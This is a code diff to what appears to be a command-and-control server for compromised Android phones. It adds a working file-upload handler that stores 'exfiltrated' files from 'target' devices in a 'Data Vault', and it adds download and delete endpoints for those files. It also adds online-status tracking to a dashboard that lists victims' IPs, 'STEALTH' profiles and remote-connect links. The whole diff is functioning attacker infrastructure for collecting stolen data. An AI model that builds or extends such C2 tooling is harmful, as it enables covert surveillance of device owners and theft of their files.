@@ -11,10 +11,17 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use('/c2', express.static(path.join(__dirname, 'c2')));
 
+const UPLOADS_DIR = path.join(__dirname, 'uploads');
+if (!fs.existsSync(UPLOADS_DIR)) {
+    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+}
+app.use('/c2/downloads', express.static(UPLOADS_DIR));
+
 const devices = new Map();
 const commandQueues = new Map();
 const pendingResponses = new Map();
 const longPollWaiters = new Map(); // deviceId -> Array of res objects
+const exfiltratedFiles = [];
 
 const DATA_FILE = path.join(__dirname, 'devices.json');
 
@@ -31,6 +38,9 @@ function loadData() {
                     }
                 });
             }
+            if (json.uploads && Array.isArray(json.uploads)) {
+                exfiltratedFiles.push(...json.uploads);
+            }
         }
     } catch (e) {}
 }
@@ -38,7 +48,8 @@ function loadData() {
 function saveData() {
     try {
         const data = {
-            devices: Array.from(devices.values())
+            devices: Array.from(devices.values()),
+            uploads: exfiltratedFiles.slice(0, 200)
         };
         fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
     } catch (e) {}
@@ -54,6 +65,14 @@ function formatTime(isoString) {
     } catch (e) {
         return new Date(isoString || Date.now()).toLocaleString();
     }
+}
+
+function formatFileSize(bytes) {
+    if (!bytes || bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
 }
 
 let lastActiveDeviceId = null;
@@ -116,6 +135,81 @@ function handleCheckin(req, res) {
     }
 }
 
+// File Upload / Exfiltration Handler
+function handleFileUpload(req, res) {
+    try {
+        const contentType = req.headers['content-type'] || '';
+        const deviceId = req.headers['x-device-id'] || req.query.deviceId || 'Unknown_Target';
+
+        if (!contentType.includes('multipart/form-data')) {
+            return res.status(400).json({ success: false, error: 'Expected multipart/form-data' });
+        }
+
+        const boundary = contentType.split('boundary=')[1];
+        if (!boundary) {
+            return res.status(400).json({ success: false, error: 'No boundary found' });
+        }
+
+        let bodyBuffer = [];
+        req.on('data', chunk => bodyBuffer.push(chunk));
+        req.on('end', () => {
+            try {
+                const buffer = Buffer.concat(bodyBuffer);
+                const boundaryStr = '--' + boundary;
+                const parts = buffer.toString('binary').split(boundaryStr);
+
+                let savedFile = null;
+
+                for (let part of parts) {
+                    if (part.includes('filename="')) {
+                        const filenameMatch = part.match(/filename="([^"]+)"/);
+                        const filename = filenameMatch ? filenameMatch[1] : `exfil_${Date.now()}.dat`;
+
+                        const headerEnd = part.indexOf('\r\n\r\n');
+                        if (headerEnd !== -1) {
+                            let fileDataBinary = part.substring(headerEnd + 4);
+                            if (fileDataBinary.endsWith('\r\n')) {
+                                fileDataBinary = fileDataBinary.substring(0, fileDataBinary.length - 2);
+                            }
+
+                            const safeFilename = `${Date.now()}_${filename.replace(/[^a-zA-Z0-9_\.-]/g, '_')}`;
+                            const filePath = path.join(UPLOADS_DIR, safeFilename);
+
+                            fs.writeFileSync(filePath, Buffer.from(fileDataBinary, 'binary'));
+
+                            const fileEntry = {
+                                id: Math.random().toString(36).substring(7),
+                                filename: safeFilename,
+                                originalName: filename,
+                                deviceId,
+                                size: Buffer.byteLength(fileDataBinary, 'binary'),
+                                timestamp: new Date().toISOString()
+                            };
+
+                            exfiltratedFiles.unshift(fileEntry);
+                            saveData();
+                            savedFile = fileEntry;
+
+                            console.log(`[EXFIL SUCCESS] Saved ${filename} (${fileEntry.size} bytes) from device ${deviceId}`);
+                        }
+                    }
+                }
+
+                if (savedFile) {
+                    res.json({ success: true, message: 'File ingested into Data Vault', file: savedFile });
+                } else {
+                    res.status(400).json({ success: false, error: 'No file found in multipart payload' });
+                }
+            } catch (err) {
+                console.error('[EXFIL ERROR]', err.message);
+                res.status(500).json({ success: false, error: err.message });
+            }
+        });
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+}
+
 // Check-in & Exfiltration Routes
 app.all('/checkin', handleCheckin);
 app.all('/checkin/', handleCheckin);
@@ -123,9 +217,27 @@ app.all('/api/checkin', handleCheckin);
 app.all('/api/checkin/', handleCheckin);
 app.post('/checkin', handleCheckin);
 
-app.post('/upload', (req, res) => {
-    console.log('[UPLOAD SUCCESS] Received exfiltrated payload from device:', req.headers['x-device-id'] || 'Unknown');
-    res.json({ success: true, message: 'File payload ingested successfully' });
+app.post('/upload', handleFileUpload);
+app.post('/api/upload', handleFileUpload);
+
+// Delete Exfiltrated File Endpoint
+app.post('/api/delete-exfil', (req, res) => {
+    try {
+        const { id } = req.body || {};
+        const idx = exfiltratedFiles.findIndex(f => f.id === id);
+        if (idx !== -1) {
+            const item = exfiltratedFiles[idx];
+            const filePath = path.join(UPLOADS_DIR, item.filename);
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+            exfiltratedFiles.splice(idx, 1);
+            saveData();
+            console.log(`[EXFIL DELETED] Removed file ${item.filename}`);
+            return res.json({ success: true });
+        }
+        res.status(404).json({ success: false, error: 'File not found' });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
 });
 
 // Device Rename / Alias API Endpoint
@@ -200,12 +312,24 @@ app.get('/', (req, res) => {
     }
 
     const deviceList = Array.from(devices.values());
+    const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
 
     let devicesHtml = deviceList.length === 0 ?
-        '<tr><td colspan="8" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
+        '<tr><td colspan="9" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
         deviceList.map(d => {
             const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || 'samsung');
             const subName = (d.alias && d.alias.trim()) ? ` (${d.brand || ''})` : '';
+
+            const ageSec = (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000;
+            let statusBadge = '';
+            if (ageSec < 45) {
+                statusBadge = '<span style="color:var(--neon-green); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 6px var(--neon-green);"></span>ONLINE</span>';
+            } else if (ageSec < 300) {
+                statusBadge = '<span style="color:var(--neon-yellow); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-yellow); box-shadow:0 0 6px var(--neon-yellow);"></span>IDLE</span>';
+            } else {
+                statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
+            }
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -218,9 +342,29 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
                 <td style="vertical-align: middle;">${d.battery || '100%'}</td>
                 <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
+                <td style="vertical-align: middle;">${statusBadge}</td>
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle;"><a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem; display: inline-block;">CONNECT</a></td>
+            </tr>
+            `;
+        }).join('');
+
+    let exfilHtml = exfiltratedFiles.length === 0 ?
+        '<tr><td colspan="5" style="text-align: center; color: #888; padding: 20px;">NO EXFILTRATED DATA RECEIVED YET</td></tr>' :
+        exfiltratedFiles.map(f => {
+            const devObj = devices.get(f.deviceId);
+            const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
+            return `
+            <tr>
+                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${f.originalName}</td>
+                <td style="vertical-align: middle; color: #aaa;">${devLabel}</td>
+                <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
+                <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
+                <td style="vertical-align: middle;">
+                    <a href="/c2/downloads/${f.filename}" download="${f.originalName}" style="background: var(--neon-green); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block; margin-right: 5px;">DOWNLOAD</a>
+                    <button onclick="deleteExfil('${f.id}')" style="background: rgba(255,49,49,0.2); border: 1px solid var(--danger); color: var(--danger); padding: 4px 10px; border-radius: 6px; font-weight: bold; font-size: 0.65rem; cursor: pointer;">DELETE</button>
+                </td>
             </tr>
             `;
         }).join('');
@@ -244,7 +388,7 @@ app.get('/', (req, res) => {
     <div class="container">
         <div class="header" style="text-align:center; padding:20px 0; margin-bottom:20px;">
             <img src="/c2/header_dashboard.png" style="width: 65%; max-width: 650px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
-            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
+            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
         </div>
 
         <div class="card" style="margin-top: 20px;">
@@ -258,6 +402,7 @@ app.get('/', (req, res) => {
                             <th>OS VERSION</th>
                             <th>BATTERY</th>
                             <th>ENDPOINT IP</th>
+                            <th>STATUS</th>
                             <th>PROFILE</th>
                             <th>LAST CHECK-IN</th>
                             <th>ACTION</th>
@@ -270,6 +415,30 @@ app.get('/', (req, res) => {
             </div>
             <div style="text-align: center; margin-top: 20px;">
                 <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH_REGISTRY</button>
+            </div>
+        </div>
+
+        <!-- EXFILTRATED DATA VAULT CARD -->
+        <div class="card" style="margin-top: 25px; border-left-color: var(--neon-cyan);">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 style="margin: 0; color: var(--neon-cyan);">EXFILTRATED_DATA_VAULT</h2>
+                <span style="font-size: 0.7rem; color: #aaa;">TOTAL PAYLOADS: <b style="color: var(--neon-green);">${exfiltratedFiles.length}</b></span>
+            </div>
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>FILE NAME</th>
+                            <th>TARGET DEVICE</th>
+                            <th>FILE SIZE</th>
+                            <th>TIMESTAMP</th>
+                            <th>ACTION</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${exfilHtml}
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
@@ -291,6 +460,25 @@ app.get('/', (req, res) => {
                 }
             })
             .catch(err => alert('Network error updating device name.'));
+        }
+    }
+
+    function deleteExfil(id) {
+        if (confirm('Permanently delete this exfiltrated payload file from C2 Vault?')) {
+            fetch('/api/delete-exfil', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert('Failed to delete file: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Network error deleting file.'));
         }
     }
     </script>
